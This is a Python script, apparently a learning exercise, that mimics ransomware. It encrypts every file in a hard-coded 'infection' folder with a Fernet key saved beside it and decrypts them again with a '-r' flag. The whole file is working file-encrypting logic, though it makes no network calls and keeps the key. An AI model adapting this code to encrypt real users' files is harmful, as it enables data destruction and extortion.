import cryptography
import argparse
import os
from cryptography.fernet import Fernet

target = 'infection'

if os.path.isfile('key.key') == True:
	with open('key.key', 'rb') as fkey:
		key = fkey.read()
		print(key)

elif os.path.isfile('key.key') == False:
	key = Fernet.generate_key()
	# Save encription key to a file
	with open('key.key', 'wb') as key_file:
	    key_file.write(key)

# Decript a file
def yz_decript_file(fl):
	print('ok')
	file = target + '/' + fl
	print(file)

	# with open('.key', 'rb') as filekey:
	#     key = filekey.read()

	fernet = Fernet(key)

	with open(file, 'rb') as enc_file:
	    encrypted = enc_file.read()

	# # decrypting the file
	decrypted = fernet.decrypt(encrypted)

	# # opening the file in write mode and
	# # writing the decrypted data
	with open(file, 'wb') as dec_file:
		dec_file.write(decrypted)


# Cure the files in target directory
def yz_cure_target():
	# Get list of files
	get_files = os.listdir(target)
	# print(get_files)
	for f in get_files:
		print(f'Scanning {f}')
		yz_decript_file(f)


# Encript a file
def yz_enrcipt_file(fl):
	file = target + '/' + fl
	# Use Key
	fernet = Fernet(key)
	with open(file, 'rb') as f:
		original = f.read()

	# Encript the file
	encrypted = fernet.encrypt(original)

	# Open file and write encripted data
	with open(file, 'wb') as encrypted_file:
		encrypted_file.write(encrypted)


# Infect the files in target folder
def yz_infect_target(target):
	# Get list of files
	get_files = os.listdir(target)
	# print(get_files)
	for f in get_files:
		print(f'Scanning {f}')
		yz_enrcipt_file(f)


# Handle Arguments
def yz_handle_args(args):
	if args.help:
		print(f"Help is: {args.help}")
	if args.h:
		print(f"H is: {args.h}")
	if args.v:
		print(f"V is: {args.v}")
	if args.r:
		print(f"R is: {args.r}")
		yz_cure_target()
	if args.reverse:
		print(f"Reverse is: {args.reverse}")
	if args.silent:
		print(f'Silent is: {args.silent}')
	if args.s:
		print(f'S is: {args.s}')


# Parse CLI arguments
def cli_scan():
	scan = argparse.ArgumentParser(add_help=False)

	# The program will have the option "–help" or "-h" to display help. To do this we have to overwrite the build-in
	scan.add_argument('-h', action='store_true')
	scan.add_argument('-help', action='store_true')
    
    # The program will have the option "–version" or "-v" to show the version of the program.
	scan.add_argument("-v", help="", type=bool, nargs='?', const=True)
	
	# # The program will have the option "–reverse" or "-r" followed by the key entered as
	# # an argument to reverse the infection.    
	scan.add_argument("-r", help="", type=bool, nargs='?', const=True)
	scan.add_argument("-reverse", help="", type=bool, nargs='?', const=True)

    # # The program will show each encrypted file during the process unless the option is
	# # indicated "–silent" or "-s", in which case the program will not produce any output.
	scan.add_argument("-s", help="", type=bool, nargs='?', const=True)
	scan.add_argument("-silent", help="", type=bool, nargs='?', const=True)    

	return scan.parse_args()


if __name__ == '__main__':
	args = cli_scan()
	yz_handle_args(args)
	if not args.r:
		print('Not R')
		yz_infect_target(target)




